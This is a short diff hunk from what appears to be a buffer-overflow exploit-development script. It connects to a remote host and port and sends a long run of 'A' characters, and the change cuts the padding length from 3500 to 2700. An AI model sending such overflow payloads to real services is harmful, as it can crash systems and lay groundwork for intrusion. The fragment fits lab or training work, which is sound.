@@ -13,7 +13,7 @@ s.connect((RHOST,RPORT))
 #build a message
 
 buf = ""
-buf += "A"*3500
+buf += "A"*2700
 buf += "\n"
 
 #send the message
